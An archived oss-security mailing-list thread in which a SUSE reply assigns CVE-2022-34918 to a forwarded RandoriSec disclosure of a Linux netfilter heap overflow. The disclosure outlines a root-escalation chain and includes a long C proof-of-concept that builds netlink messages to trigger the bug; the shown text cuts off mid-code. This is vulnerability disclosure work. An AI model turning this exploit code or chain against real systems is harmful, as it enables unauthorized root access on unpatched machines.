<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>oss-security - Re: Linux kernel: Netfilter heap buffer overflow in
 nft_set_elem_init</title>

<link href="/style.css" type="text/css" rel="stylesheet">
<style type="text/css">
.calendar { text-align: center; }
.ccell { background: #ccc; width: 5ex; padding: 2px; }

.cal_brief { text-align: center; }
.cal_brief td:first-child { background: inherit; }
.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
.cal_big { text-align: center; padding: 0; margin: 0; }
.cal_big td { padding: 0 2px; }
.cal_mon { text-align: center; }
.cal_mon th { font-size: small; padding: 0; margin: 0; }
.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
	padding: 2px; text-align: right; }
.cal_mon td[colspan] { background: inherit; }
.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
	margin-top: -2pt; font-weight: bold; }
.cal_mon a { text-align: right; margin-left: -4em; float: right; }
</style>
</head>

<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">


<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>

<td>
<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
<td width="100%">
<div class="nav">
<ul>
<li><a href="/">Products</a>
<ul>
<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="/john/">Free &amp; Open Source for any platform</a>
<li><a href="/john/cloud/">in the cloud</a>
<li><a href="/john/pro/linux/">Pro for Linux</a>
<li><a href="/john/pro/macosx/">Pro for macOS</a>
</ul>
<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</ul>
<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
<li><a href="/pam/">Pluggable Authentication Modules</a>
<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</ul>
<li><a href="/services/">Services</a>
<li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="/articles/">Articles</a>
<li><a href="/presentations/">Presentations</a>
</ul>
<li><a>Resources</a>
<ul>
<li><a href="/lists/">Mailing lists</a>
<li><a href="https://openwall.info/wiki/">Community wiki</a>
<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
<li><a href="https://cvsweb.openwall.com">Source code repositories (CVSweb)</a>
<li><a href="/mirrors/">File archive &amp; mirrors</a>
<li><a href="/signatures/">How to verify digital signatures</a>
<li><a href="/ove/">OVE IDs</a>
</ul>
<li id="last-li"><a href="/news">What's new</a>
</ul>
</div>


</table>


<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
<TR><TD>
<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
<TR><TD bgcolor="#ECF8FF">
<a href="https://twitter.com/openwall">
Follow @Openwall on Twitter for new release announcements and other news</a>

</TABLE>
</TABLE>

<a href="../../../2022/07/04/8">[&lt;prev]</a> <a href="2">[next&gt;]</a> <a href="../../../2022/07/03/6">[&lt;thread-prev]</a> <a href="../../../2022/08/06/5">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
<pre style="white-space: pre-wrap">
Message-ID: &lt;20220705065628.GA23475&#64;suse.de&gt;
Date: Tue, 5 Jul 2022 08:56:28 +0200
From: Marcus Meissner &lt;meissner&#64;...e.de&gt;
To: oss-security&#64;...ts.openwall.com
Cc: Hugues ANGUELKOV &lt;hanguelkov&#64;...dorisec.fr&gt;
Subject: Re: Linux kernel: Netfilter heap buffer overflow in
 nft_set_elem_init

Hi,

Mitre has assigned CVE-2022-34918 to this issue.

Ciao, Marcus
On Sat, Jul 02, 2022 at 09:37:46PM +0200, Solar Designer wrote:
&gt; Hi,
&gt; 
&gt; The message below was meant to start an embargo for the issue, but it
&gt; was CC'ed to netfilter-devel, which is a public mailing list, so it also
&gt; appears here:
&gt; 
&gt; <a href="https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452&#64;randorisec.fr/T/#u" rel="nofollow">https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452&#64;randorisec.fr/T/#u</a>
&gt; 
&gt; In fact, I am forwarding a copy as downloaded from "lore", but of course
&gt; it looks identical to what reached linux-distros.
&gt; 
&gt; Alexander
&gt; 
&gt; ----- Forwarded message from Hugues ANGUELKOV &lt;hanguelkov&#64;...dorisec.fr&gt; -----
&gt; 
&gt; Date: Fri, 1 Jul 2022 17:43:16 +0200
&gt; To: linux-distros
&gt; Cc: security, pablo, kadlec, fw, netfilter-devel, coreteam, davy, amongodin
&gt; From: Hugues ANGUELKOV &lt;hanguelkov&#64;...dorisec.fr&gt;
&gt; Subject: [vs] Netfilter vulnerability disclosure
&gt; 
&gt; Hello everyone,
&gt; 
&gt; One of our collaborators at RandoriSec, Arthur Mongodin found a 
&gt; vulnerability within the netfilter subsystem during his internship.
&gt; Successful exploitation of this bug leads to a Local Privilege 
&gt; Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04 
&gt; (Linux 5.15.0-39-generic).
&gt; This vulnerability is a heap buffer overflow due to a weak check and has 
&gt; been introduced within the commit 
&gt; [fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](<a href="https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81" rel="nofollow">https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81</a>), 
&gt; it affects the Linux kernel since the version 5.8 and is still present today.
&gt; 
&gt; The heap buffer overflow happens in the function `nft_set_elem_init` 
&gt; (`/net/netfilter/nf_tables_api.c`)
&gt; 
&gt; ```c
&gt; void *nft_set_elem_init(const struct nft_set *set,
&gt; ??????????? const struct nft_set_ext_tmpl *tmpl,
&gt; ??????????? const u32 *key, const u32 *key_end,
&gt; ??????????? const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
&gt; {
&gt; ??? struct nft_set_ext *ext;
&gt; ??? void *elem;
&gt; 
&gt; ??? elem = kzalloc(set-&gt;ops-&gt;elemsize + tmpl-&gt;len, 
&gt; gfp);??????????????????? &lt;===== (0)
&gt; ??? if (elem == NULL)
&gt; ??????? return NULL;
&gt; 
&gt; ??? ...
&gt; 
&gt; ??? if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
&gt; ??????? memcpy(nft_set_ext_data(ext), data, 
&gt; set-&gt;dlen);???????????????????? &lt;===== (1)
&gt; 
&gt; ??? ...
&gt; 
&gt; ??? return elem;
&gt; }
&gt; ```
&gt; 
&gt; A buffer is allocated at (0) without taking in consideration the value 
&gt; `set-&gt;dlen` used at (1) for the copy.
&gt; The computation of the needed space (`tmpl-&gt;len`) is realized before the 
&gt; call to `nft_set_elem_init`, however,
&gt; ?a weak check on a user input allows a user to provide an element with 
&gt; a data length lower than the `set-&gt;dlen` for the allocation.
&gt; This check is located within the function `nft_set_elem_parse_data` 
&gt; (`/net/netfilter/nf_tables_api.c`).
&gt; 
&gt; ```c
&gt; static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
&gt; ????????????????? struct nft_data_desc *desc,
&gt; ????????????????? struct nft_data *data,
&gt; ????????????????? struct nlattr *attr)
&gt; {
&gt; 
&gt; ??? ...
&gt; 
&gt; ??? if (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != set-&gt;dlen) 
&gt; {???????? &lt;===== (2)
&gt; ??????? nft_data_release(data, desc-&gt;type);
&gt; ??????? return -EINVAL;
&gt; ??? }
&gt; 
&gt; ??? return 0;
&gt; }
&gt; ```
&gt; 
&gt; As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the 
&gt; comparison between `desc-&gt;len` and `set-&gt;dlen` is not done.
&gt; Finally, `desc-&gt;len` it is used to compute `tmpl-&gt;len` at (0) and 
&gt; `set-&gt;dlen` for the copy at (1) and they can be different.
&gt; 
&gt; The vulnerable code path can be reached if the kernel is built with the 
&gt; configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
&gt; To exploit the vulnerability, an attacker may need to obtain an 
&gt; unprivileged user namespace to gain the capability `CAP_NET_ADMIN` 
&gt; (`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and 
&gt; `kernel.unprivileged_userns_clone = 1`).
&gt; 
&gt; 
&gt; The exploitation was simplified by the use of an uninitialized variable 
&gt; in `nft_add_set_elem`:
&gt; 
&gt; ```c
&gt; static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set, 
&gt; const struct nlattr *attr, u32 nlmsg_flags)
&gt; {
&gt; ? struct nft_set_elem elem;
&gt; ? ...
&gt; }
&gt; ```
&gt; 
&gt; First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data` 
&gt; will be filled `set-&gt;dlen` bytes, the second iteration will only erase 
&gt; the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.
&gt; 
&gt; We get an infoleak by overwriting the field `datalen` of 
&gt; an`user_key_payload` structure. The write primitive can be obtained with 
&gt; an unlinking attack on the `list_head` of the `simple_xattr` structure.
&gt; We targeted the `modprobe_path` to gain root permission by executing a 
&gt; shell wrapper.
&gt; 
&gt; The following Proof of Concept (PoC) will trigger KASAN on the upstream 
&gt; kernel (Linux 5.19.0-rc4)
&gt; 
&gt; ```c
&gt; #define _GNU_SOURCE
&gt; #include &lt;stdio.h&gt;
&gt; #include &lt;sched.h&gt;
&gt; #include &lt;stdlib.h&gt;
&gt; #include &lt;stdint.h&gt;
&gt; #include &lt;string.h&gt;
&gt; #include &lt;unistd.h&gt;
&gt; #include &lt;limits.h&gt;
&gt; #include &lt;arpa/inet.h&gt;
&gt; #include &lt;sys/xattr.h&gt;
&gt; #include &lt;sys/socket.h&gt;
&gt; #include &lt;linux/netlink.h&gt;
&gt; #include &lt;linux/netfilter.h&gt;
&gt; #include &lt;linux/netfilter/nfnetlink.h&gt;
&gt; #include &lt;linux/netfilter/nf_tables.h&gt;
&gt; 
&gt; #define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } 
&gt; while(0)
&gt; 
&gt; #define ID 1337
&gt; #define SET_NAME "name\0\0\0"
&gt; #define LEAK_SET_NAME "leak\0\0\0"
&gt; #define TABLE "table\0\0"
&gt; 
&gt; #define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
&gt; #define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
&gt; #define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
&gt; #define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
&gt; #define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
&gt; 
&gt; #define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + 
&gt; sizeof(struct nlattr) + 8)
&gt; 
&gt; #define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - 
&gt; sizeof(nft_set_ext)(align) - min datasize
&gt; 
&gt; #define BUFFER_SIZE 64
&gt; 
&gt; uint8_t buffer[BUFFER_SIZE] = {0};
&gt; 
&gt; void new_ns(void) {
&gt; 
&gt; ??? if (unshare(CLONE_NEWUSER))
&gt; ??????? do_error_exit("unshare(CLONE_NEWUSER)");
&gt; 
&gt; ??? if (unshare(CLONE_NEWNET))
&gt; ??????? do_error_exit("unshare(CLONE_NEWNET)");
&gt; }
&gt; 
&gt; struct nlmsghdr *get_batch_begin_nlmsg(void) {
&gt; 
&gt; ??? struct nlmsghdr *nlh = (struct nlmsghdr 
&gt; *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; ??? struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);
&gt; 
&gt; ??? if (!nlh)
&gt; ??????? do_error_exit("malloc");
&gt; 
&gt; ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; ??? nlh-&gt;nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
&gt; ??? nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_BEGIN;
&gt; ??? nlh-&gt;nlmsg_pid = getpid();
&gt; ??? nlh-&gt;nlmsg_flags = 0;
&gt; ??? nlh-&gt;nlmsg_seq = 0;
&gt; 
&gt; ??? /* Used to access to the netfilter tables subsystem */
&gt; ??? nfgm-&gt;res_id = NFNL_SUBSYS_NFTABLES;
&gt; 
&gt; ??? return nlh;
&gt; }
&gt; 
&gt; struct nlmsghdr *get_batch_end_nlmsg(void) {
&gt; 
&gt; ??? struct nlmsghdr *nlh = (struct nlmsghdr 
&gt; *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; 
&gt; ??? if (!nlh)
&gt; ??????? do_error_exit("malloc");
&gt; 
&gt; ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; ??? nlh-&gt;nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
&gt; ??? nlh-&gt;nlmsg_type = NFNL_MSG_BATCH_END;
&gt; ??? nlh-&gt;nlmsg_pid = getpid();
&gt; ??? nlh-&gt;nlmsg_flags = NLM_F_REQUEST;
&gt; ??? nlh-&gt;nlmsg_seq = 0;
&gt; 
&gt; ??? return nlh;
&gt; }
&gt; 
&gt; struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, 
&gt; uint16_t data_len) {
&gt; ??? attr-&gt;nla_type = type;
&gt; ??? attr-&gt;nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
&gt; ??? return (void *)attr + sizeof(struct nlattr);
&gt; }
&gt; 
&gt; struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t 
&gt; value) {
&gt; ??? attr-&gt;nla_type = type;
&gt; ??? attr-&gt;nla_len = U32_NLA_SIZE;
&gt; ??? *(uint32_t *)NLA_ATTR(attr) = htonl(value);
&gt; 
&gt; ??? return (void *)attr + U32_NLA_SIZE;
&gt; }
&gt; 
&gt; struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const 
&gt; char name[8]) {
&gt; ??? attr-&gt;nla_type = type;
&gt; ??? attr-&gt;nla_len = S8_NLA_SIZE;
&gt; ??? memcpy(NLA_ATTR(attr), name, 8);
&gt; 
&gt; ??? return (void *)attr + S8_NLA_SIZE;
&gt; }
&gt; 
&gt; struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, 
&gt; uint8_t *buffer, uint64_t buffer_size) {
&gt; ??? attr-&gt;nla_type = type;
&gt; ??? attr-&gt;nla_len = NLA_BIN_SIZE(buffer_size);
&gt; ??? memcpy(NLA_ATTR(attr), buffer, buffer_size);
&gt; 
&gt; ??? return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
&gt; }
&gt; void create_table(int sock, const char *name) {
&gt; ??? struct msghdr msg;
&gt; ??? struct sockaddr_nl dest_snl;
&gt; ??? struct iovec iov[3];
&gt; ??? struct nlmsghdr *nlh_batch_begin;
&gt; ??? struct nlmsghdr *nlh;
&gt; ??? struct nlmsghdr *nlh_batch_end;
&gt; ??? struct nlattr *attr;
&gt; ??? struct nfgenmsg *nfm;
&gt; 
&gt; ??? /* Destination preparation */
&gt; ??? memset(&amp;dest_snl, 0, sizeof(dest_snl));
&gt; ??? dest_snl.nl_family = AF_NETLINK;
&gt; ??? memset(&amp;msg, 0, sizeof(msg));
&gt; 
&gt; ??? /* Netlink batch_begin message preparation */
&gt; ??? nlh_batch_begin = get_batch_begin_nlmsg();
&gt; 
&gt; ??? /* Netlink table message preparation */
&gt; ??? nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
&gt; ??? if (!nlh)
&gt; ??????? do_error_exit("malloc");
&gt; 
&gt; ??? memset(nlh, 0, TABLEMSG_SIZE);
&gt; ??? nlh-&gt;nlmsg_len = TABLEMSG_SIZE;
&gt; ??? nlh-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | NFT_MSG_NEWTABLE;
&gt; ??? nlh-&gt;nlmsg_pid = getpid();
&gt; ??? nlh-&gt;nlmsg_flags = NLM_F_REQUEST;
&gt; ??? nlh-&gt;nlmsg_seq = 0;
&gt; 
&gt; ??? nfm = NLMSG_DATA(nlh);
&gt; ??? nfm-&gt;nfgen_family = NFPROTO_INET;
&gt; 
&gt; ??? /** Prepare associated attribute **/
&gt; ??? attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
&gt; ??? set_str8_attr(attr, NFTA_TABLE_NAME, name);
&gt; 
&gt; ??? /* Netlink batch_end message preparation */
&gt; ??? nlh_batch_end = get_batch_end_nlmsg();
&gt; 
&gt; ??? /* IOV preparation */
&gt; ??? memset(iov, 0, sizeof(struct iovec) * 3);
&gt; ??? iov[0].iov_base = (void *)nlh_batch_begin;
&gt; ??? iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
&gt; ??? iov[1].iov_base = (void *)nlh;
&gt; ??? iov[1].iov_len = nlh-&gt;nlmsg_len;
&gt; ??? iov[2].iov_base = (void *)nlh_batch_end;
&gt; ??? iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;
&gt; 
&gt; ??? /* Message header preparation */
&gt; ??? msg.msg_name = (void *)&amp;dest_snl;
&gt; ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
&gt; ??? msg.msg_iov = iov;
&gt; ??? msg.msg_iovlen = 3;
&gt; 
&gt; ??? sendmsg(sock, &amp;msg, 0);
&gt; 
&gt; ??? /* Free used structures */
&gt; ??? free(nlh_batch_end);
&gt; ??? free(nlh);
&gt; ??? free(nlh_batch_begin);
&gt; }
&gt; 
&gt; void create_set(int sock, const char *set_name, uint32_t set_keylen, 
&gt; uint32_t data_len, const char *table_name, uint32_t id) {
&gt; ??? struct msghdr msg;
&gt; ??? struct sockaddr_nl dest_snl;
&gt; ??? struct nlmsghdr *nlh_batch_begin;
&gt; ??? struct nlmsghdr *nlh_payload;
&gt; ??? struct nlmsghdr *nlh_batch_end;
&gt; ??? struct nfgenmsg *nfm;
&gt; ??? struct nlattr *attr;
&gt; ??? uint64_t nlh_payload_size;
&gt; ??? struct iovec iov[3];
&gt; 
&gt; ??? /* Prepare the netlink sockaddr for msg */
&gt; ??? memset(&amp;dest_snl, 0, sizeof(struct sockaddr_nl));
&gt; ??? dest_snl.nl_family = AF_NETLINK;
&gt; 
&gt; ??? /* First netlink message: batch_begin */
&gt; ??? nlh_batch_begin = get_batch_begin_nlmsg();
&gt; 
&gt; ??? /* Second netlink message : Set attributes */
&gt; ??? nlh_payload_size = sizeof(struct 
&gt; nfgenmsg);???????????????????????????????????? // Mandatory
&gt; ??? nlh_payload_size += 
&gt; S8_NLA_SIZE;??????????????????????????????????????????????? // 
&gt; NFTA_SET_TABLE
&gt; ??? nlh_payload_size += 
&gt; S8_NLA_SIZE;??????????????????????????????????????????????? // NFTA_SET_NAME
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // NFTA_SET_ID
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_SET_KEY_LEN
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_SET_FLAGS
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_SET_DATA_TYPE
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_SET_DATA_LEN
&gt; ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
&gt; 
&gt; ??? /** Allocation **/
&gt; ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
&gt; ??? if (!nlh_payload)
&gt; ??????? do_error_exit("malloc");
&gt; 
&gt; ??? memset(nlh_payload, 0, nlh_payload_size);
&gt; 
&gt; ??? /** Fill the required fields **/
&gt; ??? nlh_payload-&gt;nlmsg_len = nlh_payload_size;
&gt; ??? nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | NFT_MSG_NEWSET;
&gt; ??? nlh_payload-&gt;nlmsg_pid = getpid();
&gt; ??? nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
&gt; ??? nlh_payload-&gt;nlmsg_seq = 0;
&gt; 
&gt; 
&gt; ??? /** Setup the nfgenmsg **/
&gt; ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
&gt; ??? nfm-&gt;nfgen_family = 
&gt; NFPROTO_INET;?????????????????????????????????????????????? // Verify if 
&gt; it is compulsory
&gt; 
&gt; ??? /** Setup the attributes */
&gt; ??? attr = (struct nlattr *)((void *)nlh_payload + 
&gt; NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; ??? attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
&gt; ??? attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
&gt; ??? attr = set_u32_attr(attr, NFTA_SET_ID, id);
&gt; ??? attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
&gt; ??? attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
&gt; ??? attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
&gt; ??? set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);
&gt; 
&gt; ??? /* Last netlink message: batch_end */
&gt; ??? nlh_batch_end = get_batch_end_nlmsg();
&gt; 
&gt; ??? /* Setup the iovec */
&gt; ??? memset(iov, 0, sizeof(struct iovec) * 3);
&gt; ??? iov[0].iov_base = (void *)nlh_batch_begin;
&gt; ??? iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
&gt; ??? iov[1].iov_base = (void *)nlh_payload;
&gt; ??? iov[1].iov_len = nlh_payload-&gt;nlmsg_len;
&gt; ??? iov[2].iov_base = (void *)nlh_batch_end;
&gt; ??? iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;
&gt; 
&gt; ??? /* Prepare the message to send */
&gt; ??? memset(&amp;msg, 0, sizeof(struct msghdr));
&gt; ??? msg.msg_name = (void *)&amp;dest_snl;
&gt; ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
&gt; ??? msg.msg_iov = iov;
&gt; ??? msg.msg_iovlen = 3;
&gt; 
&gt; ??? /* Send message */
&gt; ??? sendmsg(sock, &amp;msg, 0);
&gt; 
&gt; ??? /* Free allocated memory */
&gt; ??? free(nlh_batch_end);
&gt; ??? free(nlh_payload);
&gt; ??? free(nlh_batch_begin);
&gt; }
&gt; 
&gt; void add_elem_to_set(int sock, const char *set_name, uint32_t 
&gt; set_keylen, const char *table_name, uint32_t id, uint32_t data_len, 
&gt; uint8_t *data) {
&gt; ??? struct msghdr msg;
&gt; ??? struct sockaddr_nl dest_snl;
&gt; ??? struct nlmsghdr *nlh_batch_begin;
&gt; ??? struct nlmsghdr *nlh_payload;
&gt; ??? struct nlmsghdr *nlh_batch_end;
&gt; ??? struct nfgenmsg *nfm;
&gt; ??? struct nlattr *attr;
&gt; ??? uint64_t nlh_payload_size;
&gt; ??? uint64_t nested_attr_size;
&gt; ??? struct iovec iov[3];
&gt; 
&gt; ??? /* Prepare the netlink sockaddr for msg */
&gt; ??? memset(&amp;dest_snl, 0, sizeof(struct sockaddr_nl));
&gt; ??? dest_snl.nl_family = AF_NETLINK;
&gt; 
&gt; ??? /* First netlink message: batch */
&gt; ??? nlh_batch_begin = get_batch_begin_nlmsg();
&gt; 
&gt; ??? /* Second netlink message : Set attributes */
&gt; 
&gt; ??? /** Precompute the size of the nested field **/
&gt; ??? nested_attr_size = 0;
&gt; 
&gt; ??? nested_attr_size += sizeof(struct 
&gt; nlattr);????????????????????????????????????? // Englobing attribute
&gt; ??? nested_attr_size += sizeof(struct 
&gt; nlattr);????????????????????????????????????? // NFTA_SET_ELEM_KEY
&gt; ??? nested_attr_size += 
&gt; NLA_BIN_SIZE(set_keylen);????????????????????????????????????? // 
&gt; NFTA_DATA_VALUE
&gt; ??? nested_attr_size += sizeof(struct 
&gt; nlattr);????????????????????????????????????? // NFTA_SET_ELEM_DATA
&gt; ??? nested_attr_size += sizeof(struct 
&gt; nlattr);????????????????????????????????????? // NFTA_DATA_VERDICT
&gt; ??? nested_attr_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_VERDICT_CODE
&gt; 
&gt; ??? nlh_payload_size = sizeof(struct 
&gt; nfgenmsg);???????????????????????????????????? // Mandatory
&gt; ??? nlh_payload_size += sizeof(struct 
&gt; nlattr);????????????????????????????????????? // NFTA_SET_ELEM_LIST_ELEMENTS
&gt; ??? nlh_payload_size += 
&gt; nested_attr_size;?????????????????????????????????????????? // All the 
&gt; stuff described above
&gt; ??? nlh_payload_size += 
&gt; S8_NLA_SIZE;??????????????????????????????????????????????? // 
&gt; NFTA_SET_ELEM_LIST_TABLE
&gt; ??? nlh_payload_size += 
&gt; S8_NLA_SIZE;??????????????????????????????????????????????? // 
&gt; NFTA_SET_ELEM_LIST_SET
&gt; ??? nlh_payload_size += 
&gt; U32_NLA_SIZE;?????????????????????????????????????????????? // 
&gt; NFTA_SET_ELEM_LIST_SET_ID
&gt; ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
&gt; 
&gt; ??? /** Allocation **/
&gt; ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
&gt; ??? if (!nlh_payload) {
&gt; ??????? do_error_exit("malloc");
&gt; ??? }
&gt; ??? memset(nlh_payload, 0, nlh_payload_size);
&gt; 
&gt; ??? /** Fill the required fields **/
&gt; ??? nlh_payload-&gt;nlmsg_len = nlh_payload_size;
&gt; ??? nlh_payload-&gt;nlmsg_type = (NFNL_SUBSYS_NFTABLES &lt;&lt; 8) | 
&gt; NFT_MSG_NEWSETELEM;
&gt; ??? nlh_payload-&gt;nlmsg_pid = getpid();
&gt; ??? nlh_payload-&gt;nlmsg_flags = NLM_F_REQUEST;
&gt; ??? nlh_payload-&gt;nlmsg_seq = 0;
&gt; 
&gt; ??? /** Setup the nfgenmsg **/
&gt; ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
&gt; ??? nfm-&gt;nfgen_family = NFPROTO_INET;
&gt; 
&gt; ??? /** Setup the attributes */
&gt; ??? attr = (struct nlattr *)((void *)nlh_payload + 
&gt; NLMSG_SPACE(sizeof(struct nfgenmsg)));
&gt; ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
&gt; ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
&gt; ??? attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
&gt; ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, 
&gt; nested_attr_size);
&gt; 
&gt; ??? attr = set_nested_attr(attr, 0, nested_attr_size - 4);
&gt; ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, 
&gt; NLA_BIN_SIZE(set_keylen));
&gt; ??? attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer, 
&gt; set_keylen);
&gt; ??? attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + 
&gt; sizeof(struct nlattr));
&gt; ??? attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
&gt; ??? set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
&gt; 
&gt; ??? /* Last netlink message: End of batch */
&gt; ??? nlh_batch_end = get_batch_end_nlmsg();
&gt; 
&gt; ??? /* Setup the iovec */
&gt; ??? memset(iov, 0, sizeof(struct iovec) * 3);
&gt; ??? iov[0].iov_base = (void *)nlh_batch_begin;
&gt; ??? iov[0].iov_len = nlh_batch_begin-&gt;nlmsg_len;
&gt; ??? iov[1].iov_base = (void *)nlh_payload;
&gt; ??? iov[1].iov_len = nlh_payload-&gt;nlmsg_len;
&gt; ??? iov[2].iov_base = (void *)nlh_batch_end;
&gt; ??? iov[2].iov_len = nlh_batch_end-&gt;nlmsg_len;
&gt; 
&gt; ??? /* Prepare the message to send */
&gt; ??? memset(&amp;msg, 0, sizeof(struct msghdr));
&gt; ??? msg.msg_name = (void *)&amp;dest_snl;
&gt; ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
&gt; ??? msg.msg_iov = iov;
&gt; ??? msg.msg_iovlen = 3;
&gt; 
&gt; ??? /* Send message */
&gt; ??? sendmsg(sock, &amp;msg, 0);
